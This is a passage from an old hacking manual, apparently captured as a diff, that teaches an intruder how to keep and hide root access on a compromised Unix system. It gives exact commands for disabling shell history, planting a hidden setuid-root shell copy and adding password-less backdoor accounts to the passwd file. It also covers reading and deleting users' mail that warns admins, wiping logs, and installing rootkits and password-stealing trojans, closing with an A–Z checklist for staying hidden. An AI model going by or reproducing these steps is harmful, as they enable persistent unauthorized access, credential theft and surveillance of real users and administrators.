+can do your thing on the logs for all of the attempts you made on the system
+to get back in.
+
+Ok here are some tricks of the trade.
+
+History Files:
+--------------
+Always put your .bash_history to /dev/null, if you don't make sure you at least
+edit it.  Remember the .bash_history will always have your last commands until
+the logoff.  So if you edit it, it will show that you are editing it. You might
+try changing your shell and editing it there, but this all seems like a pain,
+just set it to /dev/null
+
+1. Delete the file in the user directory .bash_history if it there.
+2. Type this command in the home directory: ln -s /dev/null .bash_history
+
+Nested directory:
+-----------------
+Always find a directory on the system to hide your files.  There are a few good
+ones that most users never look into.
+
+In the users home directory look for .term, all you will find in this directory
+is an executable file called termrc.  Admin's and users alike are used to seeing this
+hidden directory, and never EVER go into it.  if they did what do you think
+they would say to an executable file being in there called termrc?  You are right!
+Nothing .... it belongs there and it is what they expect to see there.
+
+So lets say we make termrc a little bigger, and add suid perm's ... are you
+getting the idea???? I hope you guessed it... go to the /bin directory and
+type cp bash (or sh whatever is there) ~username/.term/termrc
+then type : chown root ~username/.term/termrc
+          : chgrp root ~username/.term/termrc
+          : chmod +s ~username/.term/termrc
+
+Now you have a nested file that can get you root on the system any time that
+will not be easy for the admin to find.  If you want to get fancy, touch
+the file date to make it look like an older file.
+
+Another directory off the user accounts expected to be there and unused would
+be .elm, .term or Mail, or try making a directory called '...' this is harder
+to notice seeing the first directories that show are . and .., so it can go
+un-noticed easy.  This is how it would look if they did a long ls:
+
+1024 Jan 29 21:03 .
+1024 Dec 28 00:12 ..
+1024 Jan 29 21:03 ...
+ 509 Mar 02  1996 .bash_history
+  22 Feb 20  1996 .forward
+ 164 May 18  1996 .kermrc
+  34 Jun 06  1993 .less
+ 114 Nov 23  1993 .lessrc
+1024 May 18  1996 .term
+1024 May 19  1996 public_html
+
+see how it seems to just fit into place?
+
+but if it was just a ls -l, this is what would be seen:
+
+1024 May 19  1996 public_html
+
+Remember you can always look for some REAL LONG file path that you are sure
+that no one would ever even want to enter into, and use this for your nested
+directory.  You can even make your own directory there like:(...) ;)
+
+
+Making new commands
+--------------------
+After you check the cron to see if there is md5 being used there, you might
+want to either copy one of your exploits to another filename in the system,
+or maybe just overwrite a command that you know would never be used.  If
+you copy to a new file name make sure you touch the file date.  This is not
+so long lasting because sooner or later they will patch the exploit and your
+new file you made will not work anymore.
+
+It is better to use a shell for the new filename, and then make it suid.
+
+Adding or changing passwd entry's
+---------------------------------
+Another backdoor that you can use is to add a new user to the passwd file.
+This needs to be done with caution making it look like it belongs there.
+Never use your passwd addition, never login, it is just for a backup in case
+you loose access.
+
+There are different thoughts here: you do not have to make it a root account
+that could cause notice to it right away.  You know you can have root any time
+you want it.  Lets practice ...
+
+We want to make our account look like it belongs, so lets keep to the top of
+the file.
+
+root:fVi3YqWnkd4rY:0:0:root:/root:/bin/bash
+sysop:mZjb4XjnJT1Ys:582:200:System Operator:/home/sysop:/bin/bash
+bin:*:1:1:bin:/bin:
+daemon:*:2:2:daemon:/sbin:
+adm:*:3:4:adm:/var/adm:
+lp:*:4:7:lp:/var/spool/lpd:
+sync:*:5:0:sync:/sbin:/bin/sync
+shutdown:*:6:0:shutdown:/sbin:/sbin/shutdown
+halt:*:7:0:halt:/sbin:/sbin/halt
+mail:*:8:12:mail:/var/spool/mail:
+news:*:9:13:news:/usr/lib/news:
+uucp:*:10:14:uucp:/var/spool/uucppublic:
+operator:*:11:0:operator:/root:/bin/bash
+games:*:12:100:games:/usr/games:
+man:*:13:15:man:/usr/man:
+postmaster:*:14:12:postmaster:/var/spool/mail:/bin/bash
+nobody:*:65535:100:nobody:/dev/null:
+ftp:*:404:1::/home/ftp:/bin/bash
+
+Looking at the above passwd file leaves us a few options so i will just list
+them here.
+
+1. Look at the user line for operator, ftp, and postmaster.  All of these
+accounts have shells with no passwd's set yet.  From your shell just type:
+
+passwd postmaster
+
+Set the account with no passwd by just pressing enter.  Now you will be able
+to log into this account any time without a password and the file will still
+look right to the admin.
+
+2. add this line to the passwd file:
+
+syst::13:12:system:/var/spool:/bin/bash
+
+Place it in the file where it seems to flow.  You can leave the :: for the
+passwd or set the passwd to what you want by typing: passwd syst from the
+root shell.  Set the group and id above to what you like.
+
+
+3. Look at the line above for sync
+
+sync:*:5:0:sync:/sbin:/bin/sync
+
+Change this to :
+
+sync:*:5:0:sync:/sbin:/bin/bash and then run <passwd sync> and leave the passwd
+blank.  (or set a passwd don't matter) On this account we are even gid=0 <G>rin
+
+
+Installing games
+----------------
+
+You could always install exploitable doom or abuse into the system if they
+already have games installed.  I will include the root exploits for these
+games below in the appendix.
+
+Always be watching
+------------------
+
+Always know who the admin's are on a system, you can find them by looking at
+the passwd file to see home directories, placement of the uid, group access
+accounts, and ALWAYS read all of the bash_history files in the user directories
+to see who is using admin commands.  You will also learn allot of new commands
+from reading history files, but you want to know who is who on the system.
+Get to know your system well. Look for users using su:  View the log files
+to see who is using admin commands.
+
+Always be watching the system, keep track of who is on while you are.  Watch
+the admin's history to see what commands they are using, ttysnoops? too many
+ps commands?  finger commands after ps or w or who commands will show they
+are watching what other users on the system are doing.  Watch your admin's
+and get to know how aware they are of users on their system.
+
+Reading system mail
+
+Rember first NEVER to use system mail programs!  They will be able to tell you
+are reading their mail.  I use a combo of a few things.  Here you go...
+
+1. cd /var/spool/mail
+
+This will put you into the directory that holds all of the unread mail, or
+waiting mail.  Now you can do things like:
+
+grep -i security * |more
+grep -i hack * |more
+grep -i intruder * |more
+grep -i passwd * |more
+grep -i password * |more
+
+Then if needed pico username, and ctrl w to search for your maeesge.  You
+can also delete messages if you see some other admin is telling them that
+your user name is hacking their machine from their domain.
+
+For a mail reader that will allow toy to read mail without updating pointers
+try:
+
+http://obsidian.cse.fau.edu/~fc
+has a util on it that can cat /var/spool/mail files without changing the
+last read dates.. ie they have no idea that you have read their mail.
+
+Also remember you can find other system mail in user's directories.  Make sure
+to look in the /root directory.  Look for /root/mail or username/mail or other
+directories or filders that contain older mail.
+
+Happy Hunting ...
+
+--------------------------------
+Section 7B
+Root and Demon kits and trojans
+--------------------------------
+
+Root kits are C source for ps, login, netstat and sometimes some other
+programs that have been hacked for you.  With these kits you will be
+able to replace the login files on the hacked box so that you can login
+without an account on the machine.
+
+You will also be able to patch ps so that you will not show up when an
+admin uses the ps command.  With the ps patch you can also have it not show
+processes that have certain file names such as any file that starts with
+'sniff'.
+
+Demon kits will have hacked programs for identd, login demon, ping, su,
+telnetd, and, socket.
+
+Trojans will be any file that you can use that will allow you to exploit
+the system in some way.  An su trojan placed in the admin's directory would
+run the trojan su first after you change the export path for him ;) and report
+back that he typed the wrong passwd and delete the trojan file, but saving
+the password he typed to the /tmp directory.
+
+A login trojan would save all login passwords to a file on the machine
+for you.  I think you get the idea ;)
+
+Demon and Linux root kits have been uuencoded and attached to the end of
+appendix VI
+
+******************************************
+* Appendix I - Things to do after access *
+******************************************
+
+
+I think in this paper we have covered most of the things  you can do after
+access, so I will make this in the style of a checklist from a to z.
+
+a. learn who the admin's are on the system
+b. watch the system with ps -auxe and ps -auxef (if it works) and pstree to
+   try and keep track of what others are doing
+c. read all of the bash history files or any history files you can find on the
+   machine to learn more yourself, and to learn about the users
+d. make as many backdoor's into the system as you can that you are sure will
+   not be found out
+e. keep the access to yourself, don't give out users passwords on the machine
+   you get root on.
+f. always clean your utmp and wtmp right away when you login
+g. always clean your mess as you go along, this includes your xferlog and
+   messages
+h. if you have root access make sure to read /etc/syslog.conf and
+   /etc/login.defs to see how the system is logging
+i. before changing binary files look at the root cron to see what they are
+   running.
+j. look for md5 on the system
+k. look for separate ftp logs
+l. make sure to clean the www logs if you ever send phf commands to the server
+m. make an suid root shell and place it somewhere on the system
+n. do only what you are sure of, don't do everything in this hacking manual all
+   at once or you are asking to get cought
+o. only use nested directories, do not put files into user directories where
+   all they need to do is type ls to see them
+p. don't add user accounts and think they will not notice you.
+q. don't use pine or other mail programs to read users mail. if you want to
+   read mail go to the mail dir and read it from unix, new mail you will find
+   in /var/spool/mail read it there.
+r. don't change the system so that other programs they have running will not
+   work any more, they will be on you like fly's on shit
+s. don't delete files on the system unless you put them there
+t. do not modify their web pages, like i was here ... you are not a hacker you
+   are a little kid wanting attention
+u. do not change any passwords on the system (unless you are doing it for
+   access and have backed up the passwd file and replace it right after you
+   login
+v. do not use any root account machines for irc access, or to load a bot on
+w. if your root account changes or you create files that are owned by the
+   wrong group, be sure to chown the files
+x. do not use .rhosts if there is already one there that is being used
+y. never telnet or ftp to your account from the hacked box
+z. don't fuck up their machine! only do what you know how to do.
+
+. . .
